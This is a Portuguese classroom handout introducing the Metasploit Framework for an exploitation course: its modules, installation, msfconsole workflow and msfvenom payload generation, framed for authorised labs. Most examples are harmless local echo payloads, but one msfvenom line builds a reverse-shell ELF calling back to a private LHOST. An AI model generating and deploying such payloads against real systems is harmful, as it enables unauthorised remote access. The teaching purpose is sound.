# Introdução ao Metasploit (material de aula)

Este documento é a **parte expositiva** sobre o Metasploit: para apresentar em sala,
mostrar os comandos e introduzir o framework. Ele é independente da plataforma.

> **Importante sobre o ambiente:** o container do pwn.college usado nos desafios é
> **offline e não tem o `msfvenom` instalado** (`msfvenom: command not found`; o
> instalador via `curl` falha com `Could not resolve host`; `sudo`/`apt` não funcionam).
> Portanto, **o Metasploit não roda dentro dos desafios** — e por isso ele **não tem
> módulos de prática** neste dojo. Fica como este material conceitual. A prática da
> ferramenta é feita **fora** do pwn.college (máquina do professor, VM Kali ou Docker),
> usando os comandos deste documento, em outro momento. A prática pontuada do dojo é
> toda em `pwntools`/C (shellcode nos módulos 1–7; corrupção e buffer overflow nos
> módulos 8–14).

---

## 1. O que é o Metasploit

O **Metasploit Framework** é a ferramenta padrão da indústria para desenvolvimento,
teste e execução de exploits em **laboratório autorizado** (pentest, CTF, pesquisa).
Em vez de escrever cada exploit do zero, ele oferece:

- uma **biblioteca de módulos** prontos (exploits, payloads, encoders, etc.);
- um **console** (`msfconsole`) para orquestrar tudo;
- um **gerador de payloads** por linha de comando (`msfvenom`);
- gerenciamento de **sessões** abertas em alvos.

Ligação com o nosso dojo: nos módulos 1–7 você escreveu shellcode à mão com
`pwntools`. O Metasploit automatiza exatamente esse tipo de trabalho, em escala.

### Paralelo direto com o que já vimos

| Metasploit | Equivalente no dojo |
|---|---|
| **payload** (código que roda no alvo) | o shellcode dos módulos 1–7 |
| **`msfvenom`** (gera payloads) | o seu `pwntools` |
| **encoder** (transforma os bytes, evita bad chars) | o decoder XOR do módulo 5 (`encoded`) |
| **stager / stage** (payload em etapas) | o payload staged do módulo 6 |
| **exploit** (entrega o payload por uma vulnerabilidade) | o buffer overflow dos módulos 12–14 |
| **`msfconsole`** | — (orquestrador; não tem equivalente manual) |

---

## 2. Arquitetura e componentes

O framework organiza tudo em **tipos de módulo**:

- **exploits** — abusam de uma vulnerabilidade específica para executar um payload
  (ex.: um stack buffer overflow em um serviço).
- **payloads** — o que roda após o exploit ter sucesso. Três famílias:
  - *singles* (stageless): payload completo de uma vez (como o shellcode "inteiro");
  - *stagers*: um pedaço pequeno que baixa/recebe o resto (como o módulo 6);
  - *stages*: o restante entregue pelo stager.
- **encoders** — reescrevem os bytes do payload para evitar bad chars (ex.: `0x00`) ou
  assinaturas simples. **Não** servem para "ficar indetectável".
- **nops** — geram NOP sleds (o do módulo 11).
- **auxiliary** — scanners, fuzzers, módulos que não entregam shell.
- **post** — ações após obter acesso (coleta, pivô) — fora do escopo desta aula.

Conceitos relacionados:

- **Meterpreter**: um payload avançado, em memória, com um shell rico (arquivos,
  processos, rede). Aqui é apenas **conceito** — não usamos em rede.
- **sessions**: conexões/shells abertos que o console gerencia.
- **database (PostgreSQL)**: guarda hosts, serviços e resultados entre execuções.

---

## 3. Instalação (fora do pwn.college)

Escolha **um** ambiente com internet e privilégio:

**a) Kali Linux** — já vem com o Metasploit:
```bash
msfconsole -q
```

**b) Docker** (qualquer máquina com Docker):
```bash
docker run -it metasploitframework/metasploit-framework
```

**c) Instalador oficial (omnibus)** em Linux/macOS:
```bash
curl -fsSL https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb -o msfinstall
chmod 755 msfinstall
./msfinstall
```

Confirme:
```bash
msfconsole --version
msfvenom --version
```

---

## 4. `msfconsole` — comandos essenciais (o console)

O `msfconsole` é o centro do framework. Fluxo típico de uso de um exploit:

```text
search  -> use  -> info/show options  -> set  -> check/exploit  -> sessions
```

Comandos para mostrar em aula:

```bash
msfconsole -q                 # abre o console (sem banner)

help                          # lista de comandos
search type:exploit smb       # procura módulos (por tipo, nome, CVE...)
use exploit/linux/http/...    # seleciona um módulo
info                          # descrição, opções, referências do módulo
show options                  # parâmetros a configurar
show payloads                 # payloads compatíveis com o exploit atual

set RHOSTS 10.0.0.5           # alvo
set LHOST 10.0.0.1            # seu host (para payloads que "voltam")
set PAYLOAD linux/x64/exec    # escolhe o payload
setg RHOSTS 10.0.0.5          # 'setg' = global, vale para todos os módulos

check                         # testa se o alvo é vulnerável (quando suportado)
exploit                       # dispara (alias: run)

sessions                      # lista sessões abertas
sessions -i 1                 # interage com a sessão 1
background                    # volta ao console sem fechar a sessão
```

> Em uma **demonstração em rede**, `RHOSTS`, `LHOST`, `exploit` e `sessions` só devem
> ser usados contra alvos **de laboratório autorizado** (ex.: Metasploitable numa rede
> isolada). Nesta disciplina, isso é conceito; não executamos contra máquinas reais.

---

## 5. `msfvenom` — gerar payloads (o que mais interessa aqui)

O `msfvenom` é o gerador de payloads por linha de comando — o análogo do seu
`pwntools`. Anatomia de um comando:

```bash
msfvenom -p <payload> [OPÇÕES do payload] -f <formato> -b <bad chars> -e <encoder> -o <arquivo>
```

Flags que valem mostrar:

| Flag | Para que serve | Exemplo |
|---|---|---|
| `-l payloads` | lista o que existe | `msfvenom -l payloads \| grep linux/x64` |
| `-p` | escolhe o payload | `-p linux/x64/exec` |
| `-f` | formato de saída | `-f raw`, `-f c`, `-f python`, `-f elf` |
| `-b` | bytes proibidos (bad chars) | `-b '\x00\x0a'` |
| `-e` | encoder | `-e x64/xor_dynamic` |
| `-o` | arquivo de saída | `-o payload.bin` |
| `--list-options -p ...` | opções de um payload | `-p linux/x64/exec --list-options` |

### Exemplos para a aula

Executar um comando local (sem rede), formato bruto:
```bash
msfvenom -p linux/x64/exec CMD='/bin/echo MSF_SETUP_OK' -f raw -o payload.bin
od -An -tx1 -v payload.bin          # inspeciona os bytes crus
```

Mesmo payload, **sem byte nulo**, com encoder (liga ao módulo 3 e ao módulo 5):
```bash
msfvenom -p linux/x64/exec CMD='/bin/echo MSF_ENC_OK' -b '\x00' -e x64/xor_dynamic -f raw -o payload.bin
od -An -tx1 -v payload.bin | grep -w 00    # não deve achar 0x00
```

Formato `-f c` (para colar em um exploit em C) e `-f python` (para script):
```bash
msfvenom -p linux/x64/exec CMD='/bin/echo oi' -f c
msfvenom -p linux/x64/exec CMD='/bin/echo oi' -f python
```

Payloads que dependem de rede (**apenas conceito** nesta disciplina):
```bash
# shell que "volta" para o atacante — exige LHOST/LPORT e um handler.
# NÃO usar fora de laboratório autorizado e isolado.
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o rev
```

---

## 6. Como amarrar com o dojo (roteiro de aula sugerido)

1. Abrir este documento e explicar **o que é** o Metasploit e seus componentes (seções 1–2).
2. Mostrar o `msfconsole` em um ambiente externo (Kali/Docker): `search`, `use`,
   `show options`, `set` — só para o aluno ver o fluxo (seção 4).
3. Focar no `msfvenom` (seção 5): gerar `linux/x64/exec` em `-f raw` e inspecionar com
   `od`. Esse é o elo com o shellcode dos módulos 1–7.
4. Gerar a versão **sem `0x00`** com `-b`/`-e` e comparar com o módulo 3 (`null-free`) e
   o módulo 5 (`encoded`).
5. Comparar os bytes do `msfvenom` com os que você gerou à mão com `pwntools` nos
   módulos 1–7 do dojo: mesma ideia, ferramenta diferente.
6. Seguir para os módulos 8–14 do pwn.college (corrupção de memória e buffer overflow)
   mostrando que o buffer overflow é o **exploit** que entrega um payload como os do
   `msfvenom`. (A prática do Metasploit em si fica para outro momento, fora daqui.)

---

## 7. Limites e responsabilidade

O Metasploit é uma ferramenta ofensiva poderosa. Tudo nesta aula é para uso em
**laboratório autorizado**: CTF, ambiente próprio, VMs isoladas (ex.: Metasploitable).
Gerar, entregar ou executar payloads contra sistemas de terceiros sem autorização é
ilegal e causa impacto real. Nesta disciplina não há alvo remoto, reverse/bind shell
real, persistência ou ataque a máquinas externas — os payloads de rede aparecem apenas
como conceito para o aluno entender o papel de cada peça.
